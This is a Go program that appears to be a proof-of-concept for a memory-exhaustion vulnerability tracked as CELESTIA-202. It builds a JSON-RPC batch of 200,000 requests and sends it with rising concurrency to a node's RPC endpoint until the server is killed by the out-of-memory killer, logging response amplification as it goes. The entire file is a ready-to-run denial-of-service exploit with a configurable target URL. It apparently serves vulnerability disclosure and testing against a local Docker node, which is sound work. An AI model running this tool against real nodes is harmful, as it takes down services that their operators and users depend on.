// Package main implements a JSON-RPC batch request generator that demonstrates
// the OOM vulnerability described in CELESTIA-202.
//
// It sends waves of concurrent batch requests with increasing concurrency,
// ramping up until the server is killed by the OOM killer.
//
// Usage:
//
//	go run attack.go [-target URL] [-batch-size N] [-method M]
package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

type rpcReq struct {
	JSONRPC string `json:"jsonrpc"`
	Method  string `json:"method"`
	Params  []any  `json:"params"`
	ID      int    `json:"id"`
}

func main() {
	target := flag.String("target", "http://localhost:26658", "RPC endpoint URL")
	batchSize := flag.Int("batch-size", 200_000, "Number of requests per batch")
	method := flag.String("method", "header.LocalHead", "RPC method to call")
	flag.Parse()

	log.SetFlags(0)
	log.SetPrefix("[attack] ")

	// Build the batch payload (shared across all goroutines — read-only).
	log.Printf("Building batch of %d %s requests...", *batchSize, *method)
	reqs := make([]rpcReq, *batchSize)
	for i := range reqs {
		reqs[i] = rpcReq{JSONRPC: "2.0", Method: *method, Params: []any{}, ID: i}
	}

	payload, err := json.Marshal(reqs)
	if err != nil {
		log.Fatalf("Failed to marshal batch: %v", err)
	}

	requestSize := len(payload)
	log.Printf("Request payload size: %.1f MB (%d bytes)", float64(requestSize)/(1024*1024), requestSize)

	// Ramp up concurrency until the server dies. Each wave adds more
	// concurrent connections, increasing the amount of request data the
	// server must hold in memory simultaneously.
	concurrencyLevels := []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 20}

	for _, concurrent := range concurrencyLevels {
		log.Printf("")
		log.Printf("=== Sending %d concurrent batches (%.1f MB total request data) ===",
			concurrent, float64(concurrent)*float64(requestSize)/(1024*1024))

		var wg sync.WaitGroup
		var failed atomic.Int32

		for i := 0; i < concurrent; i++ {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				if !sendBatch(idx, *target, payload, requestSize) {
					failed.Add(1)
				}
			}(i)
		}
		wg.Wait()

		if failed.Load() > 0 {
			log.Printf("Server failed to respond to %d/%d batches. Likely OOM-killed.",
				failed.Load(), concurrent)
			return
		}

		log.Printf("Server survived %d concurrent batches. Pausing 10s (check Docker dashboard)...", concurrent)
		time.Sleep(10 * time.Second)
	}

	log.Printf("")
	log.Printf("Server survived all concurrency levels!")
}

// sendBatch sends a single batch request. Returns true if the server responded.
func sendBatch(idx int, target string, payload []byte, requestSize int) bool {
	client := &http.Client{Timeout: 120 * time.Second}
	prefix := fmt.Sprintf("  [%d] ", idx)

	start := time.Now()
	resp, err := client.Post(target, "application/json", bytes.NewReader(payload))
	elapsed := time.Since(start)

	if err != nil {
		log.Printf("%sfailed after %s: %v", prefix, elapsed, err)
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("%sread failed after %s: %v", prefix, elapsed, err)
		return false
	}

	responseSize := len(body)
	amplification := float64(responseSize) / float64(requestSize)

	log.Printf("%s%.1f MB response in %s (%.0fx amplification)", prefix,
		float64(responseSize)/(1024*1024), elapsed, amplification)

	return true
}
